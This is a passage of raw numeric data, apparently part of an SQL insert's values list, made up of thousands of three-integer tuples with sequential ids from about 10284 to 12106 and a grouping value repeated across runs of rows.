3,540,165),(10284,525,165),(10285,475,165),(10286,390,165),(10287,349,165),(10288,342,165),(10289,338,165),(10290,300,165),(10291,278,165),(10292,231,165),(10293,219,165),(10294,209,165),(10295,190,165),(10296,151,165),(10297,136,165),(10298,75,165),(10299,58,165),(10300,53,165),(10301,50,165),(10302,7,165),(10303,4,165),(10304,2149,163),(10305,1481,163),(10306,706,163),(10307,705,163),(10308,541,163),(10309,520,163),(10310,507,163),(10311,434,163),(10312,414,163),(10313,389,163),(10314,350,163),(10315,19,163),(10316,1481,130),(10317,315,130),(10318,215,130),(10319,2772,229),(10320,2760,229),(10321,2099,229),(10322,1763,229),(10323,1248,229),(10324,1074,229),(10325,1031,229),(10326,1004,229),(10327,509,229),(10328,779,229),(10329,476,229),(10330,392,229),(10331,209,229),(10332,190,229),(10333,151,229),(10334,136,229),(10335,75,229),(10336,69,229),(10337,53,229),(10338,50,229),(10339,21,229),(10340,47,163),(10341,704,217),(10342,35,217),(10343,1642,202),(10344,1481,202),(10345,1290,202),(10346,1721,202),(10347,143,202),(10348,141,202),(10349,83,202),(10350,61,202),(10351,13,202),(10352,18,139),(10353,15,139),(10354,2772,221),(10355,2760,221),(10356,1763,221),(10357,1413,221),(10358,1248,221),(10359,1074,221),(10360,1004,221),(10361,977,221),(10362,509,221),(10363,912,221),(10364,832,221),(10365,704,221),(10366,724,221),(10367,560,221),(10368,441,221),(10369,392,221),(10370,374,221),(10371,342,221),(10372,326,221),(10373,268,221),(10374,231,221),(10375,217,221),(10376,209,221),(10377,169,221),(10378,153,221),(10379,151,221),(10380,136,221),(10381,75,221),(10382,69,221),(10383,53,221),(10384,35,221),(10385,33,221),(10386,27,221),(10387,26,221),(10388,13,221),(10389,2942,145),(10390,2315,145),(10391,1481,145),(10392,1283,145),(10393,1200,145),(10394,905,145),(10395,633,145),(10396,532,145),(10397,215,145),(10398,1431,139),(10399,1200,139),(10400,905,139),(10401,151,139),(10402,58,139),(10403,47,139),(10404,46,139),(10405,38,139),(10406,32,139),(10407,6,139),(10408,2966,150),(10409,2956,150),(10410,2718,150),(10411,2553,150),(10412,2520,150),(10413,1859,150),(10414,1844,150),(10415,1552,150),(10416,1482,150),(10417,1365,150),(10418,1310,150),(10419,1268,150),(10420,1108,150),(10421,1037,150),(10422,1011,150),(10423,509,150),(10424,884,150),(10425,793,150),(10426,784,150),(10427,771,150),(10428,540,150),(10429,477,150),(10430,448,150),(10431,344,150),(10432,264,150),(10433,263,150),(10434,258,150),(10435,216,150),(10436,215,150),(10437,150,150),(10438,90,150),(10439,78,150),(10440,75,150),(10441,52,150),(10442,51,150),(10443,47,150),(10444,46,150),(10445,40,150),(10446,39,150),(10447,37,150),(10448,22,150),(10449,20,150),(10450,18,150),(10451,17,150),(10452,977,197),(10453,832,197),(10454,704,197),(10455,441,197),(10456,367,197),(10457,153,197),(10458,74,197),(10459,35,197),(10460,34,197),(10461,33,197),(10462,1002,195),(10463,977,195),(10464,819,195),(10465,706,195),(10466,705,195),(10467,704,195),(10468,441,195),(10469,374,195),(10470,367,195),(10471,234,195),(10472,74,195),(10473,35,195),(10474,33,195),(10475,21,195),(10476,2772,201),(10477,1248,201),(10478,1074,201),(10479,509,201),(10480,912,201),(10481,876,201),(10482,771,201),(10483,392,201),(10484,390,201),(10485,342,201),(10486,338,201),(10487,268,201),(10488,231,201),(10489,217,201),(10490,209,201),(10491,206,201),(10492,190,201),(10493,169,201),(10494,151,201),(10495,136,201),(10496,75,201),(10497,69,201),(10498,53,201),(10499,50,201),(10500,27,201),(10501,1,201),(10502,2643,165),(10503,2373,165),(10504,977,165),(10505,566,165),(10506,374,165),(10507,153,165),(10508,34,165),(10509,33,165),(10510,81,165),(10511,2772,191),(10512,2760,191),(10513,2099,191),(10514,1763,191),(10515,1482,191),(10516,1146,191),(10517,1004,191),(10518,1002,191),(10519,509,191),(10520,876,191),(10521,868,191),(10522,819,191),(10523,706,191),(10524,705,191),(10525,771,191),(10526,1721,191),(10527,476,191),(10528,392,191),(10529,390,191),(10530,342,191),(10531,328,191),(10532,318,191),(10533,237,191),(10534,234,191),(10535,231,191),(10536,206,191),(10537,203,191),(10538,160,191),(10539,151,191),(10540,143,191),(10541,141,191),(10542,92,191),(10543,75,191),(10544,61,191),(10545,53,191),(10546,50,191),(10547,21,191),(10548,19,191),(10549,977,248),(10550,875,248),(10551,704,248),(10552,441,248),(10553,392,248),(10554,374,248),(10555,283,248),(10556,153,248),(10557,125,248),(10558,35,248),(10559,26,248),(10560,704,198),(10561,283,198),(10562,125,198),(10563,26,198),(10564,1763,204),(10565,1413,204),(10566,1248,204),(10567,1074,204),(10568,1004,204),(10569,977,204),(10570,509,204),(10571,779,204),(10572,704,204),(10573,724,204),(10574,560,204),(10575,392,204),(10576,390,204),(10577,374,204),(10578,342,204),(10579,300,204),(10580,231,204),(10581,209,204),(10582,151,204),(10583,136,204),(10584,125,204),(10585,75,204),(10586,60,204),(10587,53,204),(10588,35,204),(10589,1,204),(10590,2848,189),(10591,2772,189),(10592,2485,189),(10593,2367,189),(10594,1991,189),(10595,1074,189),(10596,704,189),(10597,485,189),(10598,392,189),(10599,283,189),(10600,209,189),(10601,167,189),(10602,152,189),(10603,151,189),(10604,75,189),(10605,4,189),(10606,2500,177),(10607,977,177),(10608,704,177),(10609,441,177),(10610,374,177),(10611,367,177),(10612,283,177),(10613,167,177),(10614,74,177),(10615,4,177),(10616,42,165),(10617,11,165),(10618,2894,174),(10619,2769,174),(10620,2500,174),(10621,2469,174),(10622,2413,174),(10623,2235,174),(10624,2160,174),(10625,2011,174),(10626,1929,174),(10627,1920,174),(10628,1281,174),(10629,1146,174),(10630,1002,174),(10631,977,174),(10632,875,174),(10633,832,174),(10634,794,174),(10635,704,174),(10636,463,174),(10637,441,174),(10638,374,174),(10639,367,174),(10640,283,174),(10641,206,174),(10642,125,174),(10643,74,174),(10644,35,174),(10645,26,174),(10646,2114,172),(10647,2011,172),(10648,2022,172),(10649,1588,172),(10650,1431,172),(10651,1365,172),(10652,819,172),(10653,706,172),(10654,705,172),(10655,779,172),(10656,771,172),(10657,279,172),(10658,83,172),(10659,891,165),(10660,15,165),(10661,2500,181),(10662,2108,181),(10663,1290,181),(10664,875,181),(10665,704,181),(10666,374,181),(10667,367,181),(10668,283,181),(10669,242,181),(10670,202,181),(10671,167,181),(10672,125,181),(10673,74,181),(10674,35,181),(10675,26,181),(10676,1470,165),(10677,111,165),(10678,104,165),(10679,101,165),(10680,1002,172),(10681,464,172),(10682,66,172),(10683,1482,233),(10684,1283,233),(10685,868,233),(10686,496,233),(10687,476,233),(10688,232,233),(10689,225,233),(10690,160,233),(10691,143,233),(10692,141,233),(10693,92,233),(10694,61,233),(10695,60,233),(10696,20,233),(10697,2760,196),(10698,2099,196),(10699,1922,196),(10700,1796,196),(10701,1763,196),(10702,1343,196),(10703,1004,196),(10704,977,196),(10705,509,196),(10706,705,196),(10707,779,196),(10708,704,196),(10709,771,196),(10710,567,196),(10711,525,196),(10712,441,196),(10713,424,196),(10714,392,196),(10715,390,196),(10716,374,196),(10717,367,196),(10718,349,196),(10719,342,196),(10720,338,196),(10721,283,196),(10722,231,196),(10723,206,196),(10724,190,196),(10725,167,196),(10726,151,196),(10727,136,196),(10728,128,196),(10729,125,196),(10730,104,196),(10731,53,196),(10732,35,196),(10733,34,196),(10734,33,196),(10735,29,196),(10736,26,196),(10737,15,196),(10738,3,196),(10739,2367,181),(10740,1343,181),(10741,344,181),(10742,118,181),(10743,104,181),(10744,14,181),(10745,12,181),(10746,1800,165),(10747,1343,165),(10748,242,165),(10749,152,165),(10750,122,165),(10751,118,165),(10752,14,165),(10753,12,165),(10754,2443,163),(10755,328,163),(10756,237,163),(10757,172,163),(10758,160,163),(10759,148,163),(10760,141,163),(10761,137,163),(10762,128,163),(10763,121,163),(10764,119,163),(10765,92,163),(10766,83,163),(10767,82,163),(10768,61,163),(10769,42,163),(10770,21,163),(10771,12,163),(10772,2,163),(10773,1528,165),(10774,645,165),(10775,628,165),(10776,443,165),(10777,134,165),(10778,49,165),(10779,1528,163),(10780,1721,163),(10781,143,163),(10782,134,163),(10783,11,163),(10784,5,163),(10785,1984,174),(10786,1688,174),(10787,238,174),(10788,201,174),(10789,167,174),(10790,104,174),(10791,101,174),(10792,20,174),(10793,13,174),(10794,2965,165),(10795,918,165),(10796,215,165),(10797,128,165),(10798,102,165),(10799,21,165),(10800,2772,249),(10801,2760,249),(10802,2236,249),(10803,2011,249),(10804,1929,249),(10805,1920,249),(10806,1763,249),(10807,1528,249),(10808,1470,249),(10809,1290,249),(10810,1248,249),(10811,1074,249),(10812,509,249),(10813,918,249),(10814,876,249),(10815,868,249),(10816,706,249),(10817,443,249),(10818,392,249),(10819,347,249),(10820,344,249),(10821,342,249),(10822,338,249),(10823,318,249),(10824,283,249),(10825,242,249),(10826,238,249),(10827,234,249),(10828,231,249),(10829,215,249),(10830,206,249),(10831,190,249),(10832,169,249),(10833,151,249),(10834,148,249),(10835,134,249),(10836,128,249),(10837,125,249),(10838,122,249),(10839,121,249),(10840,118,249),(10841,104,249),(10842,102,249),(10843,101,249),(10844,75,249),(10845,67,249),(10846,56,249),(10847,53,249),(10848,50,249),(10849,49,249),(10850,42,249),(10851,29,249),(10852,21,249),(10853,15,249),(10854,14,249),(10855,12,249),(10856,11,249),(10857,9,249),(10858,1,249),(10859,1343,212),(10860,977,212),(10861,704,212),(10862,700,212),(10863,496,212),(10864,450,212),(10865,441,212),(10866,374,212),(10867,367,212),(10868,283,212),(10869,237,212),(10870,234,212),(10871,225,212),(10872,167,212),(10873,153,212),(10874,148,212),(10875,144,212),(10876,125,212),(10877,104,212),(10878,101,212),(10879,100,212),(10880,92,212),(10881,74,212),(10882,61,212),(10883,42,212),(10884,35,212),(10885,26,212),(10886,21,212),(10887,5,212),(10888,2,212),(10889,1,212),(10890,1528,172),(10891,918,172),(10892,709,172),(10893,443,172),(10894,347,172),(10895,242,172),(10896,215,172),(10897,148,172),(10898,134,172),(10899,122,172),(10900,121,172),(10901,118,172),(10902,102,172),(10903,78,172),(10904,42,172),(10905,20,172),(10906,14,172),(10907,12,172),(10908,11,172),(10909,1528,189),(10910,918,189),(10911,443,189),(10912,347,189),(10913,242,189),(10914,238,189),(10915,215,189),(10916,172,189),(10917,169,189),(10918,134,189),(10919,125,189),(10920,122,189),(10921,121,189),(10922,118,189),(10923,53,189),(10924,20,189),(10925,11,189),(10926,9,189),(10927,2095,248),(10928,1528,248),(10929,918,248),(10930,709,248),(10931,242,248),(10932,239,248),(10933,238,248),(10934,206,248),(10935,169,248),(10936,134,248),(10937,122,248),(10938,121,248),(10939,118,248),(10940,78,248),(10941,56,248),(10942,53,248),(10943,49,248),(10944,42,248),(10945,27,248),(10946,21,248),(10947,20,248),(10948,15,248),(10949,14,248),(10950,12,248),(10951,11,248),(10952,2,248),(10953,2095,189),(10954,977,189),(10955,876,189),(10956,237,189),(10957,206,189),(10958,83,189),(10959,33,189),(10960,21,189),(10961,2,189),(10962,2864,217),(10963,2778,217),(10964,2562,217),(10965,2535,217),(10966,2520,217),(10967,2441,217),(10968,2278,217),(10969,2108,217),(10970,2095,217),(10971,2089,217),(10972,2000,217),(10973,1748,217),(10974,1528,217),(10975,1464,217),(10976,1431,217),(10977,1343,217),(10978,1295,217),(10979,1290,217),(10980,918,217),(10981,876,217),(10982,371,217),(10983,344,217),(10984,283,217),(10985,242,217),(10986,240,217),(10987,238,217),(10988,237,217),(10989,234,217),(10990,229,217),(10991,215,217),(10992,206,217),(10993,167,217),(10994,154,217),(10995,136,217),(10996,125,217),(10997,122,217),(10998,121,217),(10999,118,217),(11000,83,217),(11001,82,217),(11002,81,217),(11003,78,217),(11004,42,217),(11005,26,217),(11006,21,217),(11007,20,217),(11008,19,217),(11009,15,217),(11010,14,217),(11011,11,217),(11012,2894,184),(11013,2769,184),(11014,2469,184),(11015,2413,184),(11016,2235,184),(11017,2011,184),(11018,1920,184),(11019,1470,184),(11020,1031,184),(11021,891,184),(11022,704,184),(11023,525,184),(11024,441,184),(11025,374,184),(11026,300,184),(11027,257,184),(11028,35,184),(11029,2095,165),(11030,852,165),(11031,701,165),(11032,700,165),(11033,611,165),(11034,257,165),(11035,240,165),(11036,239,165),(11037,229,165),(11038,172,165),(11039,155,165),(11040,119,165),(11041,108,165),(11042,98,165),(11043,83,165),(11044,82,165),(11045,78,165),(11046,25,165),(11047,19,165),(11048,2,165),(11049,1750,181),(11050,1528,181),(11051,918,181),(11052,876,181),(11053,705,181),(11054,701,181),(11055,700,181),(11056,709,181),(11057,443,181),(11058,347,181),(11059,257,181),(11060,238,181),(11061,237,181),(11062,229,181),(11063,215,181),(11064,148,181),(11065,141,181),(11066,134,181),(11067,122,181),(11068,121,181),(11069,98,181),(11070,83,181),(11071,82,181),(11072,49,181),(11073,42,181),(11074,25,181),(11075,19,181),(11076,15,181),(11077,11,181),(11078,2,181),(11079,1971,160),(11080,1528,160),(11081,1031,160),(11082,994,160),(11083,930,160),(11084,918,160),(11085,891,160),(11086,868,160),(11087,799,160),(11088,797,160),(11089,701,160),(11090,700,160),(11091,709,160),(11092,695,160),(11093,542,160),(11094,518,160),(11095,476,160),(11096,463,160),(11097,450,160),(11098,443,160),(11099,403,160),(11100,338,160),(11101,264,160),(11102,263,160),(11103,257,160),(11104,226,160),(11105,215,160),(11106,208,160),(11107,207,160),(11108,200,160),(11109,143,160),(11110,128,160),(11111,121,160),(11112,119,160),(11113,118,160),(11114,112,160),(11115,111,160),(11116,110,160),(11117,108,160),(11118,105,160),(11119,104,160),(11120,101,160),(11121,100,160),(11122,98,160),(11123,94,160),(11124,83,160),(11125,82,160),(11126,78,160),(11127,69,160),(11128,67,160),(11129,66,160),(11130,64,160),(11131,62,160),(11132,58,160),(11133,51,160),(11134,42,160),(11135,25,160),(11136,21,160),(11137,20,160),(11138,15,160),(11139,12,160),(11140,5,160),(11141,2,160),(11142,1844,196),(11143,1752,196),(11144,1669,196),(11145,1248,196),(11146,822,196),(11147,226,196),(11148,191,196),(11149,189,196),(11150,172,196),(11151,153,196),(11152,102,196),(11153,88,196),(11154,70,196),(11155,42,196),(11156,27,196),(11157,18,196),(11158,11,196),(11159,6,196),(11160,5,196),(11161,4,196),(11162,2,196),(11163,2965,217),(11164,2958,217),(11165,2951,217),(11166,2962,217),(11167,2828,217),(11168,2744,217),(11169,2733,217),(11170,2710,217),(11171,2656,217),(11172,2678,217),(11173,2586,217),(11174,2540,217),(11175,2485,217),(11176,2455,217),(11177,2444,217),(11178,2185,217),(11179,2114,217),(11180,2006,217),(11181,1832,217),(11182,1816,217),(11183,1750,217),(11184,1678,217),(11185,1669,217),(11186,1588,217),(11187,1486,217),(11188,1394,217),(11189,1171,217),(11190,1108,217),(11191,1047,217),(11192,992,217),(11193,948,217),(11194,930,217),(11195,905,217),(11196,705,217),(11197,791,217),(11198,728,217),(11199,713,217),(11200,621,217),(11201,557,217),(11202,525,217),(11203,452,217),(11204,414,217),(11205,349,217),(11206,225,217),(11207,205,217),(11208,155,217),(11209,143,217),(11210,141,217),(11211,101,217),(11212,58,217),(11213,57,217),(11214,41,217),(11215,27,217),(11216,2915,139),(11217,2073,139),(11218,1816,139),(11219,1710,139),(11220,1700,139),(11221,1662,139),(11222,1614,139),(11223,1544,139),(11224,1306,139),(11225,1249,139),(11226,2139,139),(11227,1143,139),(11228,1137,139),(11229,1035,139),(11230,1020,139),(11231,994,139),(11232,950,139),(11233,931,139),(11234,881,139),(11235,705,139),(11236,796,139),(11237,793,139),(11238,785,139),(11239,739,139),(11240,733,139),(11241,714,139),(11242,695,139),(11243,628,139),(11244,623,139),(11245,583,139),(11246,547,139),(11247,542,139),(11248,518,139),(11249,455,139),(11250,435,139),(11251,416,139),(11252,404,139),(11253,402,139),(11254,322,139),(11255,309,139),(11256,299,139),(11257,287,139),(11258,268,139),(11259,232,139),(11260,229,139),(11261,225,139),(11262,223,139),(11263,215,139),(11264,213,139),(11265,207,139),(11266,200,139),(11267,198,139),(11268,188,139),(11269,179,139),(11270,160,139),(11271,155,139),(11272,150,139),(11273,145,139),(11274,144,139),(11275,130,139),(11276,129,139),(11277,127,139),(11278,123,139),(11279,121,139),(11280,120,139),(11281,119,139),(11282,118,139),(11283,104,139),(11284,97,139),(11285,94,139),(11286,93,139),(11287,91,139),(11288,85,139),(11289,84,139),(11290,83,139),(11291,80,139),(11292,77,139),(11293,72,139),(11294,71,139),(11295,69,139),(11296,64,139),(11297,63,139),(11298,61,139),(11299,60,139),(11300,55,139),(11301,48,139),(11302,45,139),(11303,29,139),(11304,21,139),(11305,19,139),(11306,13,139),(11307,12,139),(11308,8,139),(11309,2958,144),(11310,2962,144),(11311,2865,144),(11312,2864,144),(11313,2810,144),(11314,2760,144),(11315,2670,144),(11316,2610,144),(11317,2540,144),(11318,2485,144),(11319,2404,144),(11320,2396,144),(11321,2140,144),(11322,2073,144),(11323,1971,144),(11324,1750,144),(11325,1749,144),(11326,1710,144),(11327,1700,144),(11328,1641,144),(11329,1614,144),(11330,1578,144),(11331,1544,144),(11332,1402,144),(11333,1387,144),(11334,1310,144),(11335,1290,144),(11336,1249,144),(11337,2226,144),(11338,1220,144),(11339,2139,144),(11340,1143,144),(11341,1108,144),(11342,1043,144),(11343,1035,144),(11344,1011,144),(11345,994,144),(11346,988,144),(11347,983,144),(11348,980,144),(11349,950,144),(11350,948,144),(11351,938,144),(11352,935,144),(11353,881,144),(11354,826,144),(11355,707,144),(11356,793,144),(11357,785,144),(11358,784,144),(11359,743,144),(11360,739,144),(11361,714,144),(11362,713,144),(11363,678,144),(11364,658,144),(11365,646,144),(11366,633,144),(11367,623,144),(11368,611,144),(11369,583,144),(11370,540,144),(11371,532,144),(11372,525,144),(11373,518,144),(11374,516,144),(11375,494,144),(11376,483,144),(11377,477,144),(11378,457,144),(11379,455,144),(11380,454,144),(11381,452,144),(11382,442,144),(11383,435,144),(11384,416,144),(11385,414,144),(11386,404,144),(11387,403,144),(11388,402,144),(11389,392,144),(11390,387,144),(11391,373,144),(11392,350,144),(11393,349,144),(11394,343,144),(11395,338,144),(11396,337,144),(11397,326,144),(11398,309,144),(11399,279,144),(11400,238,144),(11401,234,144),(11402,232,144),(11403,226,144),(11404,225,144),(11405,221,144),(11406,219,144),(11407,216,144),(11408,215,144),(11409,213,144),(11410,207,144),(11411,203,144),(11412,200,144),(11413,188,144),(11414,179,144),(11415,162,144),(11416,155,144),(11417,150,144),(11418,148,144),(11419,145,144),(11420,144,144),(11421,142,144),(11422,141,144),(11423,135,144),(11424,134,144),(11425,131,144),(11426,129,144),(11427,128,144),(11428,123,144),(11429,122,144),(11430,119,144),(11431,110,144),(11432,106,144),(11433,104,144),(11434,103,144),(11435,102,144),(11436,100,144),(11437,97,144),(11438,94,144),(11439,90,144),(11440,89,144),(11441,85,144),(11442,84,144),(11443,83,144),(11444,79,144),(11445,78,144),(11446,75,144),(11447,72,144),(11448,69,144),(11449,67,144),(11450,64,144),(11451,63,144),(11452,62,144),(11453,57,144),(11454,55,144),(11455,51,144),(11456,47,144),(11457,46,144),(11458,45,144),(11459,41,144),(11460,40,144),(11461,39,144),(11462,37,144),(11463,36,144),(11464,32,144),(11465,29,144),(11466,22,144),(11467,21,144),(11468,20,144),(11469,19,144),(11470,15,144),(11471,14,144),(11472,13,144),(11473,12,144),(11474,8,144),(11475,6,144),(11476,5,144),(11477,4,144),(11478,2,144),(11479,2966,132),(11480,2656,132),(11481,2544,132),(11482,2433,132),(11483,2149,132),(11484,2108,132),(11485,2104,132),(11486,1874,132),(11487,1710,132),(11488,1552,132),(11489,1539,132),(11490,1310,132),(11491,1290,132),(11492,1200,132),(11493,2139,132),(11494,1507,132),(11495,1143,132),(11496,1291,132),(11497,1196,132),(11498,1035,132),(11499,1011,132),(11500,997,132),(11501,996,132),(11502,973,132),(11503,905,132),(11504,826,132),(11505,707,132),(11506,793,132),(11507,784,132),(11508,762,132),(11509,739,132),(11510,693,132),(11511,665,132),(11512,646,132),(11513,611,132),(11514,583,132),(11515,560,132),(11516,540,132),(11517,532,132),(11518,516,132),(11519,494,132),(11520,483,132),(11521,477,132),(11522,451,132),(11523,416,132),(11524,404,132),(11525,387,132),(11526,322,132),(11527,300,132),(11528,287,132),(11529,266,132),(11530,232,132),(11531,231,132),(11532,226,132),(11533,225,132),(11534,216,132),(11535,213,132),(11536,201,132),(11537,155,132),(11538,150,132),(11539,148,132),(11540,145,132),(11541,144,132),(11542,135,132),(11543,134,132),(11544,131,132),(11545,129,132),(11546,122,132),(11547,113,132),(11548,112,132),(11549,110,132),(11550,104,132),(11551,103,132),(11552,102,132),(11553,100,132),(11554,97,132),(11555,92,132),(11556,90,132),(11557,89,132),(11558,84,132),(11559,82,132),(11560,78,132),(11561,72,132),(11562,63,132),(11563,62,132),(11564,55,132),(11565,52,132),(11566,51,132),(11567,49,132),(11568,47,132),(11569,46,132),(11570,45,132),(11571,40,132),(11572,39,132),(11573,37,132),(11574,36,132),(11575,29,132),(11576,22,132),(11577,17,132),(11578,2966,133),(11579,2859,133),(11580,2540,133),(11581,2536,133),(11582,2396,133),(11583,2149,133),(11584,2108,133),(11585,1874,133),(11586,1578,133),(11587,1552,133),(11588,1481,133),(11589,1310,133),(11590,1239,133),(11591,1200,133),(11592,2139,133),(11593,1143,133),(11594,1137,133),(11595,1291,133),(11596,1035,133),(11597,1011,133),(11598,997,133),(11599,994,133),(11600,980,133),(11601,973,133),(11602,948,133),(11603,905,133),(11604,832,133),(11605,793,133),(11606,784,133),(11607,762,133),(11608,746,133),(11609,709,133),(11610,739,133),(11611,695,133),(11612,693,133),(11613,678,133),(11614,658,133),(11615,647,133),(11616,611,133),(11617,583,133),(11618,576,133),(11619,560,133),(11620,540,133),(11621,532,133),(11622,516,133),(11623,494,133),(11624,493,133),(11625,483,133),(11626,477,133),(11627,461,133),(11628,452,133),(11629,451,133),(11630,435,133),(11631,416,133),(11632,387,133),(11633,322,133),(11634,315,133),(11635,300,133),(11636,299,133),(11637,279,133),(11638,268,133),(11639,256,133),(11640,246,133),(11641,239,133),(11642,232,133),(11643,225,133),(11644,216,133),(11645,213,133),(11646,201,133),(11647,198,133),(11648,172,133),(11649,162,133),(11650,155,133),(11651,150,133),(11652,137,133),(11653,135,133),(11654,134,133),(11655,131,133),(11656,128,133),(11657,122,133),(11658,97,133),(11659,90,133),(11660,89,133),(11661,79,133),(11662,78,133),(11663,72,133),(11664,64,133),(11665,55,133),(11666,52,133),(11667,51,133),(11668,47,133),(11669,40,133),(11670,39,133),(11671,37,133),(11672,36,133),(11673,29,133),(11674,22,133),(11675,17,133),(11676,2864,147),(11677,2824,147),(11678,2798,147),(11679,2614,147),(11680,2574,147),(11681,2595,147),(11682,2540,147),(11683,2485,147),(11684,2404,147),(11685,2278,147),(11686,2149,147),(11687,2108,147),(11688,2073,147),(11689,1971,147),(11690,1991,147),(11691,1876,147),(11692,1844,147),(11693,1816,147),(11694,1750,147),(11695,1732,147),(11696,1710,147),(11697,1704,147),(11698,1700,147),(11699,1614,147),(11700,1578,147),(11701,1552,147),(11702,1544,147),(11703,1481,147),(11704,1342,147),(11705,1310,147),(11706,1306,147),(11707,2229,147),(11708,1283,147),(11709,1426,147),(11710,1249,147),(11711,2225,147),(11712,1220,147),(11713,1200,147),(11714,2139,147),(11715,1143,147),(11716,1228,147),(11717,1196,147),(11718,1035,147),(11719,1150,147),(11720,1133,147),(11721,1134,147),(11722,1119,147),(11723,1025,147),(11724,1085,147),(11725,1011,147),(11726,997,147),(11727,994,147),(11728,976,147),(11729,509,147),(11730,950,147),(11731,948,147),(11732,905,147),(11733,877,147),(11734,852,147),(11735,845,147),(11736,826,147),(11737,707,147),(11738,791,147),(11739,784,147),(11740,766,147),(11741,760,147),(11742,709,147),(11743,739,147),(11744,734,147),(11745,724,147),(11746,714,147),(11747,713,147),(11748,695,147),(11749,693,147),(11750,678,147),(11751,658,147),(11752,633,147),(11753,583,147),(11754,560,147),(11755,540,147),(11756,532,147),(11757,516,147),(11758,493,147),(11759,486,147),(11760,477,147),(11761,461,147),(11762,454,147),(11763,452,147),(11764,451,147),(11765,448,147),(11766,442,147),(11767,435,147),(11768,422,147),(11769,416,147),(11770,402,147),(11771,392,147),(11772,387,147),(11773,349,147),(11774,326,147),(11775,309,147),(11776,303,147),(11777,300,147),(11778,299,147),(11779,287,147),(11780,264,147),(11781,263,147),(11782,260,147),(11783,246,147),(11784,238,147),(11785,232,147),(11786,225,147),(11787,219,147),(11788,216,147),(11789,215,147),(11790,213,147),(11791,207,147),(11792,200,147),(11793,188,147),(11794,163,147),(11795,162,147),(11796,155,147),(11797,150,147),(11798,142,147),(11799,141,147),(11800,139,147),(11801,135,147),(11802,134,147),(11803,128,147),(11804,123,147),(11805,122,147),(11806,97,147),(11807,90,147),(11808,84,147),(11809,79,147),(11810,78,147),(11811,77,147),(11812,72,147),(11813,63,147),(11814,62,147),(11815,55,147),(11816,52,147),(11817,51,147),(11818,47,147),(11819,46,147),(11820,45,147),(11821,41,147),(11822,40,147),(11823,39,147),(11824,37,147),(11825,36,147),(11826,22,147),(11827,21,147),(11828,19,147),(11829,17,147),(11830,15,147),(11831,2962,145),(11832,2864,145),(11833,2810,145),(11834,2733,145),(11835,2540,145),(11836,2485,145),(11837,2390,145),(11838,2325,145),(11839,2185,145),(11840,2140,145),(11841,2130,145),(11842,2095,145),(11843,2073,145),(11844,1971,145),(11845,1732,145),(11846,1700,145),(11847,1679,145),(11848,1641,145),(11849,1614,145),(11850,1578,145),(11851,1544,145),(11852,1455,145),(11853,1431,145),(11854,1402,145),(11855,1305,145),(11856,1290,145),(11857,1249,145),(11858,1220,145),(11859,2139,145),(11860,1143,145),(11861,1043,145),(11862,1035,145),(11863,994,145),(11864,988,145),(11865,983,145),(11866,950,145),(11867,948,145),(11868,930,145),(11869,917,145),(11870,877,145),(11871,872,145),(11872,844,145),(11873,707,145),(11874,705,145),(11875,791,145),(11876,700,145),(11877,739,145),(11878,714,145),(11879,713,145),(11880,695,145),(11881,682,145),(11882,678,145),(11883,623,145),(11884,605,145),(11885,583,145),(11886,560,145),(11887,525,145),(11888,518,145),(11889,516,145),(11890,493,145),(11891,454,145),(11892,452,145),(11893,445,145),(11894,442,145),(11895,435,145),(11896,404,145),(11897,402,145),(11898,394,145),(11899,389,145),(11900,383,145),(11901,349,145),(11902,343,145),(11903,309,145),(11904,239,145),(11905,238,145),(11906,232,145),(11907,226,145),(11908,225,145),(11909,222,145),(11910,213,145),(11911,207,145),(11912,200,145),(11913,188,145),(11914,155,145),(11915,150,145),(11916,145,145),(11917,144,145),(11918,141,145),(11919,135,145),(11920,134,145),(11921,129,145),(11922,128,145),(11923,123,145),(11924,113,145),(11925,112,145),(11926,111,145),(11927,108,145),(11928,107,145),(11929,106,145),(11930,104,145),(11931,103,145),(11932,102,145),(11933,101,145),(11934,100,145),(11935,98,145),(11936,97,145),(11937,94,145),(11938,85,145),(11939,84,145),(11940,83,145),(11941,72,145),(11942,63,145),(11943,62,145),(11944,55,145),(11945,41,145),(11946,36,145),(11947,32,145),(11948,21,145),(11949,20,145),(11950,19,145),(11951,15,145),(11952,6,145),(11953,2,145),(11954,2958,135),(11955,2962,135),(11956,2945,135),(11957,2418,135),(11958,2315,135),(11959,1816,135),(11960,1773,135),(11961,1732,135),(11962,1614,135),(11963,1528,135),(11964,1402,135),(11965,1365,135),(11966,1221,135),(11967,1200,135),(11968,2139,135),(11969,997,135),(11970,973,135),(11971,881,135),(11972,822,135),(11973,707,135),(11974,739,135),(11975,714,135),(11976,713,135),(11977,658,135),(11978,532,135),(11979,455,135),(11980,435,135),(11981,404,135),(11982,309,135),(11983,155,135),(11984,150,135),(11985,148,135),(11986,141,135),(11987,135,135),(11988,134,135),(11989,128,135),(11990,123,135),(11991,122,135),(11992,121,135),(11993,112,135),(11994,100,135),(11995,97,135),(11996,72,135),(11997,62,135),(11998,55,135),(11999,19,135),(12000,15,135),(12001,11,135),(12002,2,135),(12003,1200,142),(12004,2139,142),(12005,1143,142),(12006,1122,142),(12007,973,142),(12008,918,142),(12009,912,142),(12010,905,142),(12011,822,142),(12012,707,142),(12013,784,142),(12014,746,142),(12015,739,142),(12016,658,142),(12017,611,142),(12018,532,142),(12019,494,142),(12020,454,142),(12021,448,142),(12022,400,142),(12023,389,142),(12024,360,142),(12025,347,142),(12026,324,142),(12027,309,142),(12028,280,142),(12029,232,142),(12030,225,142),(12031,216,142),(12032,213,142),(12033,155,142),(12034,150,142),(12035,145,142),(12036,144,142),(12037,135,142),(12038,131,142),(12039,110,142),(12040,104,142),(12041,102,142),(12042,97,142),(12043,94,142),(12044,55,142),(12045,22,142),(12046,17,142),(12047,2616,127),(12048,2300,127),(12049,2022,127),(12050,1898,127),(12051,1672,127),(12052,1552,127),(12053,1351,127),(12054,1310,127),(12055,1268,127),(12056,1200,127),(12057,1185,127),(12058,1011,127),(12059,905,127),(12060,793,127),(12061,784,127),(12062,769,127),(12063,679,127),(12064,611,127),(12065,540,127),(12066,532,127),(12067,525,127),(12068,494,127),(12069,493,127),(12070,477,127),(12071,473,127),(12072,373,127),(12073,322,127),(12074,315,127),(12075,229,127),(12076,215,127),(12077,213,127),(12078,198,127),(12079,168,127),(12080,131,127),(12081,128,127),(12082,110,127),(12083,100,127),(12084,93,127),(12085,90,127),(12086,89,127),(12087,78,127),(12088,62,127),(12089,49,127),(12090,47,127),(12091,46,127),(12092,40,127),(12093,39,127),(12094,22,127),(12095,17,127),(12096,2965,128),(12097,2958,128),(12098,2951,128),(12099,2956,128),(12100,2942,128),(12101,2697,128),(12102,2595,128),(12103,2540,128),(12104,2443,128),(12105,2404,128),(12106,